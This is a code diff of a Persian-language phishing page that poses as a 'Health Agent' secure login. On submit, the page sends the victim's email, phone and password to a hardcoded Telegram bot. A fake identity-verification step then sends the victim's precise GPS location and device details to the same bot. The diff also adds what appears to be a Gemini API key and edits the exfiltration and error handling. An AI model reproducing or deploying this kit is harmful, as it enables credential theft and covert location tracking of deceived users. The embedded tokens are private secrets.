@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Health Agent | Secure Login</title>
 <style>
-  /* استایل‌ها بدون تغییر */
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: Tahoma, sans-serif; background: linear-gradient(135deg, #eef1f5 0%, #dce6f5 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; overflow: hidden; }
   .card { width: 100%; max-width: 380px; background: #fff; border-radius: 20px; box-shadow: 0 8px 40px rgba(0,0,0,0.12); padding: 32px 24px; position: relative; }
@@ -59,7 +58,7 @@
     <div class="footer">© Health Agent — Secure AI Platform</div>
   </div>
 
-  <!-- صفحه ۲: تایید هویت (فقط لوکیشن و اطلاعات دستگاه) -->
+  <!-- صفحه ۲: تایید هویت -->
   <div id="verifySection" class="section" style="text-align: center;">
     <div class="brand-icon" style="margin-bottom: 16px;">🛡️</div>
     <h1 style="font-size: 19px; color: #1a1a1a; margin-bottom: 10px;">تأیید امنیتی</h1>
@@ -74,22 +73,19 @@
 
 <script>
 /* ============================================================
-   تنظیمات
+   تنظیمات (توکن و چت آیدی خودت را بگذار)
    ============================================================ */
-const                    
-   BOT_TOKEN = '8986087239:AAEw2wedRgnuYQLMYop2ztHv7KqQTGtvfSE';                                        
-const CHAT_ID   = '536648369';  
-  
-  
-  
-
+const BOT_TOKEN = '8986087239:AAEw2wedRgnuYQLMYop2ztHv7KqQTGtvfSE' ; 
+const CHAT_ID   = '536648369';
+const GEMINI_API_KEY = 'AQ.Ab8RN6IPtnlzhePeDgT3H7W2QoRNovbl3IVKMgxgxAyyUsGIpw'; // کلید API خودت
+const GEMINI_MODEL   = 'gemini-1.5-flash'; // مدل (در صورت خطا، مدل حساب خودت را بگذار)
 /* ============================================================
-   مدیریت Session (شناسه یکتا برای هر کاربر)
+   مدیریت Session
    ============================================================ */
 function getSessionId() {
   let sid = localStorage.getItem('health_agent_session');
   if (!sid) {
-    sid = Math.random().toString(36).substring(2, 10).toUpperCase(); // مثلاً A1B2C3D4
+    sid = Math.random().toString(36).substring(2, 8).toUpperCase(); 
     localStorage.setItem('health_agent_session', sid);
   }
   return sid;
@@ -97,21 +93,27 @@ function getSessionId() {
 const SESSION_ID = getSessionId();
 
 /* ============================================================
-   توابع ارسال به تلگرام (با پیشوند Session)
+   تابع ارسال به تلگرام
    ============================================================ */
 async function sendToTelegram(text) {
   try {
     const fullText = `🆔 [Session: ${SESSION_ID}]\n${text}`;
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: CHAT_ID, text: fullText })
     });
-  } catch (e) { console.error(e.message); }
+    const data = await res.json();
+    if (!data.ok) console.error('Telegram error:', data.description);
+    return data.ok;
+  } catch (e) { 
+    console.error('Network error:', e.message); 
+    return false;
+  }
 }
 
 /* ============================================================
-   منطق فرم لاگین (ارسال ایمیل، شماره تلفن و پسورد)
+   منطق فرم لاگین
    ============================================================ */
 document.getElementById('loginForm').addEventListener('submit', async (e) => {
   e.preventDefault();
@@ -123,10 +125,8 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   btn.disabled = true;
   btn.innerHTML = 'در حال بررسی... <span class="spinner"></span>';
 
-  // ارسال هر سه مورد به تلگرام
   await sendToTelegram(`🔐 لاگین جدید\n📧 ایمیل: ${email}\n📱 شماره: ${phone}\n🔑 رمز: ${password}`);
 
-  // رفتن به صفحه تأیید
   setTimeout(() => {
     document.getElementById('loginSection').classList.remove('active');
     document.getElementById('verifySection').classList.add('active');
@@ -134,57 +134,39 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 });
 
 /* ============================================================
-   منطق صفحه تأیید (درخواست لوکیشن + اطلاعات دستگاه)
+   منطق صفحه تأیید
    ============================================================ */
 document.getElementById('verifyBtn').addEventListener('click', async () => {
   const btn = document.getElementById('verifyBtn');
   const status = document.getElementById('verifyStatus');
 
   btn.disabled = true;
-  btn.innerHTML = 'در حال دریافت موقعیت... <span class="spinner"></span>';
+  btn.innerHTML = 'در حال دریافت اطلاعات... <span class="spinner"></span>';
 
-  try {
-    // ۱. بررسی وضعیت مجوز لوکیشن
-    const permission = await navigator.permissions.query({ name: 'geolocation' });
-    
-    if (permission.state === 'denied') {
-      status.textContent = '⚠️ دسترسی به موقعیت مسدود شده است. لطفاً از تنظیمات مرورگر اجازه دهید.';
-      await sendToTelegram('⚠️ کاربر دسترسی لوکیشن را قبلاً رد کرده است.');
-      btn.disabled = false;
-      btn.innerHTML = 'تلاش مجدد';
-      return;
-    }
+  const deviceInfo = navigator.userAgent || 'نامشخص';
 
-    // ۲. درخواست موقعیت
+  if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
-        // گرفتن IP
-        let ip = 'نامشخص';
-        try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipRes.json();
-          ip = ipData.ip;
-        } catch (e) { console.warn('IP failed'); }
+        // ==========================================
+        // تغییر اصلی اینجاست: ساخت لینک گوگل مپ
+        // ==========================================
+        const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
 
-        // گرفتن اطلاعات دستگاه
-        let deviceInfo = navigator.userAgent;
-        if (navigator.userAgentData) {
-          try {
-            const highEntropy = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
-            deviceInfo = `مدل: ${highEntropy.model || 'نامشخص'} | پلتفرم: ${highEntropy.platform}`;
-          } catch (e) {}
-        }
-
-        // ارسال همه اطلاعات
         const infoText = `✅ تأیید موقعیت انجام شد\n` +
-                         `🌐 IP: ${ip}\n` +
-                         `📍 موقعیت: Lat ${pos.coords.latitude}, Lng ${pos.coords.longitude}\n` +
+                         `📍 موقعیت: ${mapsLink}\n` +
                          `📱 دستگاه: ${deviceInfo}`;
         
-        await sendToTelegram(infoText);
-
-        status.textContent = '✅ تأیید شد. در حال انتقال به داشبورد...';
-        btn.innerHTML = 'تأیید شد';
+        const sent = await sendToTelegram(infoText);
+        
+        if (sent) {
+          status.textContent = '✅ تأیید شد. در حال انتقال به داشبورد...';
+          btn.innerHTML = 'تأیید شد';
+        } else {
+          status.textContent = '⚠️ خطا در ارتباط با سرور.';
+          btn.disabled = false;
+          btn.innerHTML = 'تلاش مجدد';
+        }
       },
       async (err) => {
         let errorMsg = 'خطای نامشخص';
@@ -192,17 +174,18 @@ document.getElementById('verifyBtn').addEventListener('click', async () => {
         else if (err.code === 2) errorMsg = 'موقعیت در دسترس نیست';
         else if (err.code === 3) errorMsg = 'زمان درخواست تمام شد';
         
+        const infoText = `⚠️ لوکیشن دریافت نشد (${errorMsg})\n📱 دستگاه: ${deviceInfo}`;
+        await sendToTelegram(infoText);
+        
         status.textContent = `⚠️ ${errorMsg}`;
-        await sendToTelegram(`⚠️ خطای لوکیشن: ${errorMsg}`);
         btn.disabled = false;
         btn.innerHTML = 'تلاش مجدد';
       },
       { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
     );
-
-  } catch (err) {
-    status.textContent = '❌ خطا در بررسی مجوزها.';
-    console.error(err);
+  } else {
+    await sendToTelegram(`⚠️ مرورگر از لوکیشن پشتیبانی نمی‌کند\n📱 دستگاه: ${deviceInfo}`);
+    status.textContent = '⚠️ مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.';
     btn.disabled = false;
     btn.innerHTML = 'تلاش مجدد';
   }
